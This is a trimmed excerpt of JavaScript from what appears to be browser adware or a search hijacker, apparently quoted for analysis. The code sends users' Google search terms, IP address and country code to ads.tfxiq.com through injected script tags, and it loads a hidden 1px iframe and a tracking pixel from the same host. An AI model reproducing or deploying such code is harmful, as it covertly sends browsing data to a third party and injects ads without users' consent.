...
////////////////////
    ...
    {
	    /*
	    //when user on google image,no need to call any php file
		var hdtb_msb=document.getElementById("hdtb_msb"),t_flag=true;

		if(hdtb_msb){
		   var child=hdtb_msb.children;
		   for(var i=0;i<child.length;i++){
				 var className=child[i].className;
				 if(className=="hdtb_mitem hdtb_msel"){
					if(child[i].innerHTML=="Images"){
					   t_flag=false;
					   break;
					}
	    ...
	    */
        ...
        var userIp = "202.69.12.20";
        var userCountryCode = "PK";
        var confObj = null;
        var CRPName = "Torntv V9.0";
        var ref1 ="63726f73737269646572";
        var ref2 ="200106217300000000";
        var ref3 ="EBCFFD354C964828B21833478FA9DE66IE";
        var rc = "3";
        var configUrl = '//ads.tfxiq.com/c.php?q='+document.getElementById("gbqfq").value+'&s='+window.location.hostname+'&callback=configCallback';
            ...
            function secondarySearch(vari)
                {
                    ...
                    script.src = "//ads.tfxiq.com/d.php?cc=PK&user_ip=202.69.12.20&626ref2="+ref2+"&626Name="+CRPName+"&626ref3="+ref3+"&626ref1="+ref1+"&key="+encodeURIComponent(searchterma);
...
//Script to check if a GA JS is laoded in the page or not            
/* remove GA for Omer and Nick request          
    function  hasDomain(tags, somedomain){
        ...
        var regx=/(certified-toolbar|inspsearch)/gi;
        if(window.location.hostname.match(regx)){
           found=false;
        }
        return found;
    }
...
/*        
    ...
    var flag_domain=hasDomain(tags,'google-analytics.com');
    if(!flag_domain){
      onReady(function(){
      var str_src='//ads.tfxiq.com/ds.php';
     
     var res=document.getElementsByTagName("body")[0];
      var framestr="<iframe src="+str_src+" width='1px' height='1px' id='dsframe'></iframe>";
      if(res){
...
if(window.location.host.indexOf("google") == -1)
    {
        ...
        var configUrl = '//ads.tfxiq.com/c.php?s='+window.location.hostname+'&callback=configCallback';
...
function searchCallback(results) {
    ...
    //rs code
        //console.log(confObj);
    var cc = "PK";
	var reg=/^(US|IN|GB|CA|AU|IE|NZ|SG|HK)$/;
    var cc_flag=reg.test(cc);
    if(cc_flag){
	    var bqs = buildQueryString(confObj);
	    //console.log(bqs);
	    if(bqs==null){return;}
	    var trk_url=encodeURIComponent(results.Message[0].click);
	    var queryString =bqs + '&trk_url='+trk_url+'&callback=rsCallback'
	    var script = document.createElement('script');
	    var rsUrl = '//ads.tfxiq.com/n.php';
	    script.src = rsUrl + '?' +'s='+window.location.hostname+'&'+ queryString;
	    document.getElementsByTagName('head')[0].appendChild(script);
    }
    }

//rs code 
function rsCallback(results){
    if(!results) {
        console.error('Invalid  API response. No Messages found');
    }
    readResults(confObj, results);

}

function abcd(queryString){
    var img = document.createElement('img');
    img.height='1px';
    img.width='1px';
    img.src = '//ads.tfxiq.com/m.php?ld=' + queryString;
...
function readResults(confObject, results) {
    var containerId = results.rs_adcontainer_id;
